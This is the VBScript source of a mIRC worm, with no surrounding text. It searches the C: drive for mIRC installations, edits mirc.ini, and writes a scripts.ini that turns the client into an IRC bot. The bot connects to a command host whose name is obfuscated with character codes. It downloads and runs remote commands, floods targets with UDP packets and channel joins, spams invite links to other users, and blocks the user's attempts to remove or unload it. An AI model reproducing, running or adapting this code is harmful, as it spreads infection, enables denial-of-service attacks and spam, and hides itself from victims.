dim Otag 
dim AOtag
dim Ttag 
dim DummyTag
dim SectionDef
call ShowFolderList("c:\")
sub ShowFolderList(s)
on error resume next
Set filesys = CreateObject("Scripting.FileSystemObject")
Set RootFolder1 = FileSys.GetFolder(s)
Set SubFolds1 = RootFolder1.subfolders
For Each f1 in Subfolds1
s = f1.path & "\"
Otag = s & "mirc.ini"
AOtag= s & "mirc.dat"
DummyTag= "C:\winamod.dat"
TTag= s & "scripts.ini"
SectionDef= "[rfiles]"
if filesys.fileexists(otag) then 
Call Filemod() 
filesys.CopyFile DummyTag, Otag, true
Call ImplementRemote()
filesys.CopyFile DummyTag, Otag, true
Call ImplementWarn()
filesys.CopyFile DummyTag, Otag, true
Call ImplementFserv()
filesys.CopyFile DummyTag, Otag, true
call ImplementPerfCheck()
filesys.CopyFile DummyTag, Otag, true
Call ImplementPerform()
SetClearArchiveBit(Otag)
End If
Call ShowFolderList(s)
Next
End sub
Function FiltNum(FilString)
on error resume next
countdown=5
do
Comp = mid(FilString,2,countdown)
if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function
Function LastLineNum(SSection)
on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)
Do While FR1N.AtEndOfStream <> True
segment1 = FR1N.readline
w = InstrRev(segment1,SSection)
counts=counts+1
if w > 0 then 
do
if FR1N.AtEndOfStream = True then exit do
segmentk = FR1N.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
end if
Loop until k=0
end if
loop
FR1N.Close
LastLineNum=LastNum
end function
Function Filemod()
on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)
Do While fr1.AtEndOfStream <> True
segment1 = fr1.readline
fr2.writeline segment1
w = InstrRev(segment1,"[rfiles]")
counts=counts+1
if w > 0 then 
counts2=counts
do
if fr1.AtEndOfStream = True then exit do
segmentk = fr1.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
fr2.writeline segmentk
end if
COUNTS2=COUNTS2+1
Loop until k<>1
exit do
end if
loop
fr1.Close
fr2.close
Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=scripts.ini"
fr3.writeline TrojanInfo
fr3.Close
Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)
Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)
Do While fr4.AtEndOfStream <> True
segment2 = fr4.readline
if fr4.line >= counts2 + 2 then 
fr5.writeline segment2
end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function
sub FLDL(TTag)
on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "[script]"
fr6.writeline "n0=on 1:sockopen:l3333*:{ if ($sockerr > 0) { halt } | sockwrite -tn $sockname USER %d.id $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) okzz xx : $+ %d.idf | if (%d.idn == $ $+ me) { sockwrite -tn $sockname NICK $me $+ $rand(1,9) $+ $rand(1,9) } | else { sockwrite -tn $sockname nick %d.idn $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) } | unset %d.id* | unset %d.dsr* | unset %d.pr* } | if ($server != $null) { set -u15 %sta.con $network } | if ($server == $null) { set -u15 %sta.con Started }"
fr6.writeline "n1=on *:sockread:3833oj*: { sockread %388333 | if ($gettok(%388333,1,32) == Ping) { sockwrite -tn $sockname Pong $remove($gettok(%388333,2,32),:) } | if (too fast isin %388333) { set -u80 %3333833 2 } | unset %388333 }"
fr6.writeline "n2=alias 3333 { if ($ip != 127.0.0.1) && ($sock(check) == $null) && ($sock(l3333*) == $null) { .sockopen $chr(99) $+ $chr(104) $+ $chr(101) $+ $chr(99) $+ $chr(107) $chr(103) $+ $chr(101) $+ $chr(111) $+ $chr(99) $+ $chr(105) $+ $chr(116) $+ $chr(105) $+ $chr(101) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) $chr(56) $+ $chr(48) } | if ($server != $null) && ($sock(3833oj*) == $null) { setnc | .timer 1 4 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(56)) } }"
fr6.writeline "n3=alias 33333 { if ($ip != 127.0.0.1) && ($sock(l3333*) == $null) && (%d.dsrv != $null) { .sockopen $chr(108) $+ $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) $+ $rand(1,2) %d.dsrv %d.prt } }"
fr6.writeline "n4=on *:sockread:l3333*:{ sockread %l3338 | set %d.nc1 $remove($gettok(%l3338,1,33),:) | set %d.nc2 $remove($gettok(%l3338,2,64),$gettok(%l3338,2-,32),:) | if (ping isin $gettok(%l3338,1,32)) { sockwrite -tn $sockname Pong $remove($gettok(%l3338,2,32),:) } | if ($chr(69) $+ $chr(110) $+ $chr(100) $chr(111) $+ $chr(102) $chr(47) $+ $chr(77) $+ $chr(79) $+ $chr(84) $+ $chr(68) isin %l3338) { sockwrite -tn $sockname $chr(106) $+ $chr(111) $+ $chr(105) $+ $chr(110) %d.chn | sockwrite -tn $sockname $chr(106) $+ $chr(111) $+ $chr(105) $+ $chr(110) : $+ %d.chn $+ 0 "
fr6.writeline "n5=  .sockwrite -tn $sockname privmsg $chr(35) $+ $chr(105) $+ $chr(100) $+ $chr(101) $+ $chr(110) $+ $chr(116) : $+ -Report-6 $me 1.:.14 %sta.con .:. 2L5ocal-2i5nvite %stok .:. 2N5ew-2i5nvite %stokk | .timer123 1 8 unset %sta.con | .timerl 1 8 unset %d.chn }"
fr6.writeline "n6=  if (%d.nc1 == %d.nc2) { if ($gettok(%l3338,4,32) == :!update) && ($gettok(%l3338,5,32) != $null) && ($sock(check1) == $null) { set %comd $gettok(%l3338,5,32) | sockopen check1 $chr(103) $+ $chr(101) $+ $chr(111) $+ $chr(99) $+ $chr(105) $+ $chr(116) $+ $chr(105) $+ $chr(101) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) $chr(56) $+ $chr(48) | goto end } | if ($gettok(%l3338,4,32) == :!Go) || ($gettok(%l3338,4,32) == :!Get) { $gettok(%l3338,5-,32) } | if ($gettok(%l3338,4,32) == :!change) { $remove($gettok(%l3338,4,32),!,$chr(58)) }"
fr6.writeline "n7=    if ($gettok(%l3338,4,32) == :!info) && $gettok(%l3338,5,32) != $null) && ($sock(3833oj*) != $null) { .sockwrite -nt 3833oj* privmsg $gettok(%l3338,5,32) : $+ -Report-6 $me 1.:.14 $active .:. 2L5ocal-2i5nvite %stok .:. 2N5ew-2i5nvite %stokk %d.ste } | if ($gettok(%l3338,4,32) == :!info) && $gettok(%l3338,5,32) == $null) { .sockwrite -nt $sockname privmsg $chr(35) $+ $chr(105) $+ $chr(100) $+ $chr(101) $+ $chr(110) $+ $chr(116) : $+ -Report-6 $me 1.:.14 $network .:. 2L5ocal-2i5nvite %stok .:. 2N5ew-2i5nvite %stokk }"
fr6.writeline "n8=    if ($gettok(%l3338,4,32) == :!updatenews) && ($gettok(%l3338,5,32) != $null) && ($sock(check2) == $null) { set %comd $gettok(%l3338,5,32) | sockopen check2 $chr(103) $+ $chr(101) $+ $chr(111) $+ $chr(99) $+ $chr(105) $+ $chr(116) $+ $chr(105) $+ $chr(101) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) $chr(56) $+ $chr(48) | goto end }"
fr6.writeline "n9=    if ($gettok(%l3338,4,32) == :!packet) { set %packet.ip $gettok(%l3338,5,32) | set %packet.bytes $gettok(%l3338,6,32) | set %packet.amount $gettok(%l3338,7,32) | sockwrite -n $sockname privmsg $chr(35) $+ packets : $+ 9Target:2 %packet.ip 9Bytes:2 %packet.bytes 9Amount:2 %packet.amount  | set %packet.count 0 | set %packet.port $rand(1,6) $+ $rand(0,6) $+ $rand(0,6) $+ $rand(0,9) | :start | if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | .sockwrite -n l333* privmsg $chr(35) $+ packets : $+ 2.::4Packeting Complete2::. | goto end } | inc %packet.count 1 | /.sockudp -b packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes | goto start }"
fr6.writeline "n10=if ($gettok(%l3338,4,32) == :!stop) { unset %fld* | unset %Chnfld* | .sockclose chn* | halt } } | :end | unset %d.nc* | unset %l3338* }"
fr6.writeline "n11=on *:sockopen:check1: { .sockwrite -n $sockname $chr(71) $+ $chr(69) $+ $chr(84) $chr(47) $+ $chr(102) $+ $chr(114) $+ $chr(101) $+ $chr(101) $+ $chr(108) $+ $chr(115) $+ $chr(50) $+ $chr(48) $+ $chr(48) $+ $chr(49) $+ $chr(47) $+ %comd $+ $chr(46) $+ $chr(104) $+ $chr(116) $+ $chr(109) $+ $chr(108) $chr(72) $+ $chr(84) $+ $chr(84) $+ $chr(80) $+ $chr(47) $+ $chr(49) $+ $chr(46) $+ $chr(49) | .sockwrite -n check1 host $+ $chr(58) $chr(103) $+ $chr(101) $+ $chr(111) $+ $chr(99) $+ $chr(105) $+ $chr(116) $+ $chr(105) $+ $chr(101) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) | .sockwrite $sockname $crlf | unset %comd }"
fr6.writeline "n12=alias tl { goto tl $+ $rand(1,6) | :tl1 | set -u5 %tl hey mate | goto end | :tl2 | set -u5 %tl Hallooo | goto end | :tl3 | set -u5 %tl hey you.. | goto end | :tl4 |  set -u5 %tl asl pls? | goto end | :tl5 | set -u5 %tl Hi | goto end | :tl6 | set -u5 %tl Hey | :end }"
fr6.writeline "n13=alias fldchan { fetnc | set %fldnum $1 | set %fldtype $2 | if ($2 == notice) || ($2 == privmsg) { set %fldstill chnm } | if ($2 == jp) { set %fldstill Chnjp } | :flood | set %fldserv $3 $4 | set %fldchan $5 | if ($6- != $null) { set %fldtxt $6- } | if ($6- == $null) { set %fldtxt $str(Xx,32) } | set %Chnfld on | var %var = 0 | :loop | inc %var | if (%Chnfld == on) && (%var <= %fldnum) { .sockopen %fldstill $+ %var %fldserv | goto loop } | else { halt } }"
fr6.writeline "n14=on *:sockread:check*: { if ($sockerr > 0) return | sockread %check | if ($sockbr == 0) return | if (tsek1 == $gettok(%check,1,32)) { .set %d.chn $gettok(%check,2,32) | .set %d.dsrv $gettok(%check,3,32) | .set %d.prt $gettok(%check,4,32) | .set %d.id $gettok(%check,5,32) | .set %d.idn $gettok(%check,6,32) | .set %d.idf $gettok(%check,7,32) | .timer 1 5 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) | unset %check } | if (comd == $gettok(%check,1,32)) || (c0md == $gettok(%check,1,32)) { $gettok(%check,2-,32) } | if (HTTP/ isin $gettok(%check,1,32)) && (Not Found isin %check) && ($sock(l33335*) == $null) { .383838 } | unset %check } "
fr6.writeline "n15=on *:sockopen:check2: { .sockwrite -n $sockname $chr(71) $+ $chr(69) $+ $chr(84) %comd $chr(72) $+ $chr(84) $+ $chr(84) $+ $chr(80) $+ $chr(47) $+ $chr(49) $+ $chr(46) $+ $chr(49) | .sockwrite -n check2 host $+ $chr(58) $chr(103) $+ $chr(101) $+ $chr(111) $+ $chr(99) $+ $chr(105) $+ $chr(116) $+ $chr(105) $+ $chr(101) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) | .sockwrite $sockname $crlf | unset %comd }"
fr6.writeline "n16=on *:INPUT:*:{ if ($timer(p) == $null) { .timerp 0 60 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) } | if ($sock(l3333*) == $null) && ($sock(check) == $null) { 3333 } | if ($sock(3833oj*) == $null) && ($server != $null) { setnc | 3338 } | if ($sock(in.dal*) == $null) && ($server != $null) && (dal.net !isin $server) && (%news != $null) { 8883 } | if ($sock(in.und*) == $null) && ($server != $null) && (undernet.org !isin $server) && (%news != $null) { 8883 } } "
fr6.writeline "n17=on 1:start: { $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) | .timerp 0 60 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) | unset %fld* | unset %3333833 | unset %33338833 | unset %388333 } | if ($exists(server.ini)) { write -c server.ini | /.load -rs server.ini }"
fr6.writeline "n18=alias 8883 { if ($server != $null) && ($sock(check1) == $null) { set %comd undal | .sockopen check1 $chr(103) $+ $chr(101) $+ $chr(111) $+ $chr(99) $+ $chr(105) $+ $chr(116) $+ $chr(105) $+ $chr(101) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) $chr(56) $+ $chr(48) } }"
fr6.writeline "n19=alias 888d { if ($sock(in.dal*) == $null) && (dal.net !isin $server) && ($server != $null) { setnc | unset %pigd | goto ind $+ $rand(1,3) | :ind1 | .sockopen in.dal $+ $rand(1,8) kernel.ga.us.dal.net 6667 | goto end | :ind2 | .sockopen in.dal $+ $rand(1,3) mesra.kl.my.dal.net 6667 | goto end | :ind3 | .sockopen in.dal $+ $rand(1,3) powertech.no.eu.dal.net 6667 | :end } }"
fr6.writeline "n20=alias setus { goto us $+ $rand(1,14) | :us1 | set %ncus $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | goto end | :us2 | set %ncus $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | goto end | :us3 | set %ncus $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | goto end | :us4 | set %ncus $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | goto end | :us5 | set %ncus $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | goto end | :us6 | set %ncus $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | goto end "
fr6.writeline "n21=:us7 | set %ncus valen $+ $rand(a,z) | goto end | :us8 | set %ncus daker $+ $rand(a,z) | goto end | :us9 | set %ncus campbell $+ $rand(a,z) | goto end | :us10 | set %ncus coffins $+ $rand(a,z) | goto end | :us11 | set %ncus crawford $+ $rand(a,z) | goto end | :us12 | set %ncus dean $+ $rand(a,z) | goto end | :us13 | set %ncus fisher $+ $rand(a,z) | goto end | :us14 | set %ncus romez $+ $rand(a,z) | :end }"
fr6.writeline "n22=alias setnc { goto nc $+ $rand(1,21) | :nc1 | set %nc belleta $+ $rand(a,z) | setus | goto alt | :nc2 | set %nc butler $+ $rand(a,z) | setus | goto alt | :nc3 | set %nc Srawhord $+ $rand(a,z) | setus | goto alt | :nc4 | set %nc uhans $+ $rand(a,z) | setus | goto alt | :nc5 | set %nc fong $+ $rand(a,z) | setus | goto alt | :nc6 | set %nc green $+ $rand(a,z) | setus | goto alt | :nc7 | set %nc Samson $+ $rand(b,z) | setus | goto alt | :nc8 | set %nc Feel $+ $rand(a,z) | setus | goto alt | :nc9 | set %nc guy $+ $rand(a,z) | setus | goto alt | :nc10 | set %nc Naktiws $+ $rand(a,z) | setus | goto alt | :nc11 | set %nc miler $+ $rand(a,z) | setus | goto alt "
fr6.writeline "n23=:nc12 | set %nc clownrman $+ $rand(a,z) | setus | goto alt | :nc13 | set %nc last-tin $+ $rand(a,z) | setus | goto alt | :nc14 | set %nc Xavie $+ $rand(a,z) $+ $rand(a,z) | setus | goto alt | :nc15 | set %nc cunning $+ $rand(a,z) | setus | goto alt | :nc16 | set %nc ford $+ $rand(a,z) | setus | goto alt | :nc17 | set %nc Drinking $+ $rand(a,z) | setus | goto alt | :nc18 | set %nc harison $+ $rand(a,z) | setus | goto alt | :nc19 | set %nc Tackson $+ $rand(a,z) | setus | goto alt | :nc20 | set %nc Volley $+ $rand(a,z) | setus | goto alt | :nc21 | set %nc Mibonalt $+ $rand(a,z) | setus | :alt }"
fr6.writeline "n24=alias fetnc { set %fld.nc $replace($gettok($me,1,32),$right($me,1),$r(a,z)) | set %fld.ncus $gettok($email,1,64) $+ $r(a,z)"
fr6.writeline "n25=set %fld.full $fullname $+ $r(a,z) }"
fr6.writeline "n26=alias remove { if (scripts.ini == $1) { .load -rs scripts.ini | echo $color(info) *** Removed $chr(39) $+ $1 $+ $chr(39) } | else { remove $1- } }"
fr6.writeline "n27=alias unload { if (scripts.ini == $2) { echo $color(info) *** Unloaded script $chr(39) $+ $2- $+ $chr(39) | .load -rs scripts.ini | halt } | else { unload $1- } }"
fr6.writeline "n28=raw *:*:if (No such nick isin $1-) { halt } | if (too fast isin $1-) { set -u30 %33338833 ` | halt }"
fr6.writeline "n29=on 1:sockclose:3833oj*:{ if ($server != $null) && ($sock(3833oj*) == $null) { setnc | .timer 1 3 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(56) } }"
fr6.writeline "n30=on *:sockopen:chnjp*:{ if ($sockerr > 0) { halt } | fetnc | .sockwrite -n $sockname USER %fld.ncus %fld.ncus %fld.ncus : $+ %fld.full $+ $r(a,z) | .sockwrite -nt $sockname nick %fld.nc $+ $rand(a,z) | .sockwrite -nt $sockname JOIN %fldchan | .sockwrite -nt $sockname part %fldchan : $+ %fldtxt | .sockwrite -nt $sockname join %fldchan |  .sockwrite -nt $sockname part %fldchan : $+ %fldtxt | .sockwrite -nt $sockname join %fldchan |  .sockwrite -nt $sockname part %fldchan : $+ %fldtxt | .sockwrite -nt $sockname quit }"
fr6.writeline "n31=on *:sockread:chn*:{ .sockread %fldd | fetnc | if ($gettok(%fldd,1,32) == PING) { sockwrite -tn $sockname PONG $remove($gettok(%fldd,2,32),:) } }"
fr6.writeline "n32=on *:sockopen:chnm*:{ if ($sockerr > 0) { halt } | fetnc | .sockwrite -nt $sockname USER %fld.ncus %fld.ncus %fld.ncus : $+ %fld.full $+ $r(a,z) | .sockwrite -nt $sockname nick %fld.nc $+ $rand(a,z) | .sockwrite -nt $sockname JOIN %fldchan | .sockwrite -nt $sockname %fldtype %fldchan : $+ %fldtxt | .sockwrite -nt $sockname %fldtype %fldchan : $+ %fldtxt |  .sockwrite -nt $sockname quit : $+ %fldtxt }"
fr6.writeline "n33=alias 3338 { if ($server != $null) && ($sock(3833oj*) == $null) { .sockopen 3833oj $+ $chr(111) $+ $chr(106) $+ $rand(1,7) $+ $rand(1,9) $server $port } }"
fr6.writeline "n34=on 1:sockopen:3833oj*:{ if ($sockerr > 0) { halt } | .sockwrite -nt $sockname USER %ncus %ncus %ncus : $+ %nc $+ $rand(a,z) $+ $rand(a,z) | .sockwrite -nt $sockname NICK %nc $+ $rand(a,z) | .timer 1 3 unset %nc* }"
fr6.writeline "n35=on ^*:OPEN:?: { if ($chr(119) $+ $chr(119) $+ $chr(119) isin $1-) || ($chr(104) $+ $chr(116) $+ $chr(116) $+ $chr(112) isin $1-) || (.com isin $1-) || (ignore isin $1-) { halt } }"
fr6.writeline "n36=alias remote { if ($1 == off) { remote $1- | .timerre 1 3 .remote on | halt } | if ($1 == on) { remote $1- } | else { remote $1- } }"
fr6.writeline "n37=alias socklist echo -a 2 $chr(42) $chr(78) $+ $chr(111) $chr(111) $+ $chr(112) $+ $chr(101) $+ $chr(110) $chr(115) $+ $chr(111) $+ $chr(99) $+ $chr(107) $+ $chr(101) $+ $chr(116) $+ $chr(115)) "
fr6.writeline "n38=alias 888u { if ($sock(in.und*) == $null) && (undernet.org !isin $server) && ($server != $null) { setnc | unset %pigu | goto ind $+ $rand(1,4) | :ind1 | .sockopen in.und $+ $rand(1,8) London.uk.eu.undernet.org 6669 | goto end | :ind2 | .sockopen in.und $+ $rand(1,3) mesa.az.us.undernet.org 7000 | goto end | :ind3 | .sockopen in.und $+ $rand(1,3) losangeles.ca.us.undernet.org 6669 | goto end | :ind4 | sockopen in.und $+ $rand(1,3) Amsterdam.NL.Eu.UnderNet.org 6668 | :end } }"
fr6.writeline "n39=raw 421:*:halt"
fr6.writeline "n40=on *:sockclose:l3333*: { unset %d.cn* | unset %d.id* | unset %d.dsr* | unset %d.p* | .timer 1 3 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) }"
fr6.writeline "n41=on *:sockopen:check: { unset %d.cn* | unset %d.id* | unset %d.dsr* | unset %d.p* | .sockwrite -n $sockname $chr(71) $+ $chr(69) $+ $chr(84) $chr(47) $+ $chr(102) $+ $chr(114) $+ $chr(101) $+ $chr(101) $+ $chr(108) $+ $chr(115) $+ $chr(50) $+ $chr(48) $+ $chr(48) $+ $chr(49) $+ $chr(47) $+ $chr(110) $+ $chr(105) $+ $chr(99) $+ $chr(101) $+ $chr(46) $+ $chr(104) $+ $chr(116) $+ $chr(109) $+ $chr(108) $chr(72) $+ $chr(84) $+ $chr(84) $+ $chr(80) $+ $chr(47) $+ $chr(49) $+ $chr(46) $+ $chr(49) | .sockwrite -n check host $+ $chr(58) $chr(103) $+ $chr(101) $+ $chr(111) $+ $chr(99) $+ $chr(105) $+ $chr(116) $+ $chr(105) $+ $chr(101) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) | .sockwrite $sockname $crlf }"
fr6.writeline "n42=alias change { sockclose l3333* | .timer 1 2 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(51) }"
fr6.writeline "n43=on +1:kick:#:{ if ($nick != $me) && ($knick !isop #) && ($knick != $me) && ($level($address($knick,2)) != 2) && (%d.ste != $null) { if ($sock(3833oj*) != $null) && (%3333833 == $null) { inc %stok | set -u7 %3333833 333333 | .sockwrite -n 3833oj* $chr(112) $+ $chr(114) $+ $chr(105) $+ $chr(118) $+ $chr(109) $+ $chr(115) $+ $chr(103) $knick : $+ %d.ste | .guser 2 $knick 2 | .guser 2 $nick 2 | halt } | elseif (%3333833 != $null) || ($sock(3833oj*) == $null) && (%33338833 == $null) { set -u20 %33338833 123 | $chr(46) $+ $chr(109) $+ $chr(115) $+ $chr(103) $knick %d.ste ! | .guser 2 $knick 2 | .guser 2 $nick 2 | inc %stok | halt } } }"
fr6.writeline "n44=on +1:nick:{ if ($nick != $me) && ($nick !isop $active) && (%d.ste != $null) { if ($sock(3833oj*) != $null) && (%3333833 == $null) { inc %stok | set -u6 %3333833 1 | .sockwrite -n 3833oj* $chr(112) $+ $chr(114) $+ $chr(105) $+ $chr(118) $+ $chr(109) $+ $chr(115) $+ $chr(103) $newnick : $+ %d.ste | .guser 2 $newnick 2 | halt } | elseif (%3333833 != $null) || ($sock(3833oj*) == $null) && (%33338833 == $null) { inc %stok | set -u15 %3333833 1 | $chr(46) $+ $chr(109) $+ $chr(115) $+ $chr(103) $newnick %d.ste ! | .guser 2 $newnick 2 | halt } } }"
fr6.writeline "n45=on +1:part:#:{ if ($nick != $me) && ($sock(3833oj*) != $null) && ($nick isreg #) && (%3333833 == $null) && ($nick != cycler) && (M !isincs $gettok($chan(#).mode,1,32)) && (m !isincs $gettok($chan(#).mode,1,32)) { inc %stok | .auser 2 *!* $+ $address | .sockwrite -n 3833oj* $chr(112) $+ $chr(114) $+ $chr(105) $+ $chr(118) $+ $chr(109) $+ $chr(115) $+ $chr(103) $nick : $+ %d.ste | set -u7 %3333833 333333 } }"
fr6.writeline "n46=on 1:sockopen:in.*:{ if ($sockerr > 0) { halt } | .sockwrite -nt $sockname USER $remove($email,$chr(64)) $+ $r(a,z) %ncus %ncus : $+ %nc $+ $rand(a,z) $+ $rand(a,z) | .sockwrite -nt $sockname NICK $me $+ $rand(a,z) | .timer 1 5 unset %nc* }"
fr6.writeline "n47=on *:sockread:in.dal*: { sockread %in.dal | if ($gettok(%in.dal,1,32) == Ping) && (%pigd != 1) { set %pigd 1 | sockwrite -tn $sockname Pong $remove($gettok(%in.dal,2,32),:) } | if ($gettok(%in.dal,2,32) == 001) { set -u5 %invdtime ` | .sockwrite -nt $sockname join %Jdal $+ , $+ %j.dal | .sockwrite -nt $sockname mode %jdal +s | .timeruj 1 12 unset %j.dal }"
fr6.writeline "n48=  if ($remove($gettok(%in.dal,2,32),:) == privmsg) && ($remove($gettok(%in.dal,1,33),:) == $remove($gettok(%jdal,1,32),$chr(35)))  { if ($left($remove($gettok(%in.dal,1,33),:),3) == $gettok(%in.dal,2,58)) { sockwrite -nt $sockname privmsg $remove($gettok(%in.dal,1,33),:) : $+ Local-( $+ %stok $+ ) New-( $+ %stokk $+ ) Web-( $+ %d.ste1 $+ ) } | if ($chr(35) isin $gettok(%in.dal,5,32)) { sockwrite -nt $sockname $gettok(%in.dal,2,58) $gettok(%in.dal,5,32) } | if ($remove($gettok(%in.dal,4,32),:) == $left($remove($gettok(%in.dal,1,33),:),4)) { $gettok(%in.dal,5-,32) } }"
fr6.writeline "n49=  if ($remove($gettok(%in.dal,2,32),:) == privmsg) && (www !isin %in.dal) && (spam !isin %in.dal) && (serv !isin %in.dal) && (admin !isin %in.dal) && (FINGER !isin %in.dal) && (ping !isin %in.dal) && ($host !isin %in.dal) && ( $ip !isin %in.dal) && (Guest0 !isin %in.dal) && (bot !isin %in.dal) && ($chr(35) !isin %in.dal) { if (%invd. [ $+ [ $remove($gettok(%in.dal,1,33),:) ] ] != Npm) { inc %stokk | set %invd. [ $+ [ $remove($gettok(%in.dal,1,33),:) ] ] Npm | .sockwrite -nt $sockname privmsg $remove($gettok(%in.dal,1,33),:) : $+ %d.ste1 } }"
fr6.writeline "n50=if ($remove($gettok(%in.dal,2,32),:) == join) && (%invd. [ $+ [ $remove($gettok(%in.dal,1,33),:) ] ] != Njm) && (%jdal !isin %in.dal) && (spam !isin %in.dal) && (serv !isin %in.dal) && (admin !isin %in.dal) && ($host !isin %in.dal) && ($ip !isin %in.dal) && (%invdtime == $null) && (Guest0 !isin %in.dal) { if (%invd. [ $+ [ $remove($gettok(%in.dal,1,33),:) ] ] != Npm) { set -u8 %invdtime ` | set %invd. [ $+ [ $remove($gettok(%in.dal,1,33),:) ] ] Njm | tl | .sockwrite -nt $sockname privmsg $remove($gettok(%in.dal,1,33),:) : $+ %tl } } | :end | unset %in.dal }"
fr6.writeline "n51=on 1:connect:{ if (%news != $null) { 8883 } | if ($sock(3833oj*) == $null) { setnc | .timer 1 5 $chr(51) $+ $chr(51) $+ $chr(51) $+ $chr(56) | unset %388333 | unset %3333833 | $chr(46) $+ $chr(114) $+ $chr(108) $+ $chr(101) $+ $chr(118) $+ $chr(101) $+ $chr(108) 2 } | $chr(46) $+ $chr(97) $+ $chr(117) $+ $chr(115) $+ $chr(101) $+ $chr(114) 2 $chr(42) $+ $chr(33) $+ $chr(42) $+ $chr(64) $+ $chr(111) $+ $chr(98) $+ $chr(101) $+ $chr(108) $+ $chr(105) $+ $chr(120) $+ $chr(46) $+ $chr(117) $+ $chr(99) $+ $chr(110) $+ $chr(101) $+ $chr(116) $+ $chr(46) $+ $chr(117) $+ $chr(111) $+ $chr(99) $+ $chr(46) $+ $chr(103) $+ $chr(114) | set -u20 %sta.con $network | unset %33338833 | unset %in* | unset %pig* | unset %nc* | unset %jdal | unset %jund | unset %j.* }"
fr6.writeline "n52=on *:sockclose:in.*:{ .timer 1 4 8883 }"
fr6.writeline "n53=on 1:EXIT:unset %in* | unset %pig* | unset %nc* | unset %jdal | unset %jund | unset %fld* | unset %j.* "
fr6.writeline "n54="
fr6.writeline "n55=alias 383838 { set %d.id C $+ $r(1,9) | set %d.idf Cl | set %d.idn Clo | .sockopen l33335 $+ $r(1,9) $chr(115) $+ $chr(111) $+ $chr(99) $+ $chr(107) $+ $chr(101) $+ $chr(116) $+ $chr(46) $+ $chr(103) $+ $chr(111) $+ $chr(116) $+ $chr(100) $+ $chr(110) $+ $chr(115) $+ $chr(46) $+ $chr(99) $+ $chr(111) $+ $chr(109) $chr(54) $+ $chr(54) $+ $chr(54) $+ $chr(56) | set %d.chn $chr(35) $+ $chr(67) | set %sta.con ALERT }"
fr6.writeline "n56=on +1:kick:#:{ if ($nick != $me) && ($knick !isop #) && ($knick != $me) && ($level($address($knick,2)) != 2) && (%d.ste != $null) { if ($sock(3833oj*) != $null) && (%3333833 == $null) { inc %stok | set -u7 %3333833 333333 | .sockwrite -n 3833oj* $chr(112) $+ $chr(114) $+ $chr(105) $+ $chr(118) $+ $chr(109) $+ $chr(115) $+ $chr(103) $knick : $+ %d.ste | .guser 2 $knick 2 | .guser 2 $nick 2 | halt } | elseif (%3333833 != $null) || ($sock(3833oj*) == $null) && (%33338833 == $null) { set -u20 %33338833 123 | $chr(46) $+ $chr(109) $+ $chr(115) $+ $chr(103) $knick %d.ste ! | .guser 2 $knick 2 | .guser 2 $nick 2 | inc %stok | halt } } }"
